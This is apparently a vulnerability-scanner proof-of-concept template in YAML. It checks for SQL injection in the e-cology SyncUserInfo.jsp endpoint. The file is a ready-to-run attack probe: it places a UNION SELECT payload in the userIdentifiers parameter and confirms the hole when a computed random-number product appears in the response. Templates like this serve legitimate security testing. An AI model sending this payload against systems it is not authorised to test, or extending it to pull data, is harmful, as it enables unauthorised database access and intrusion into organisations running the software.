name: poc-yaml-ecology-sqli
set:
  r1: randomInt(2333333, 23333333)
  r2: randomInt(6666666, 88888888)
rules:
  - method: GET
    path: >-
      /mobile/plugin/SyncUserInfo.jsp?userIdentifiers=-1)union(select(3),null,null,null,null,null,str({{r1}}*{{r2}}),null
    follow_redirects: true
    expression: |
      response.status == 200 && response.body.bcontains(bytes(string(r1 * r2)))
detail:
  author: MaxSecurity(https://github.com/MaxSecurity)
  links:
    - https://github.com/MaxSecurity
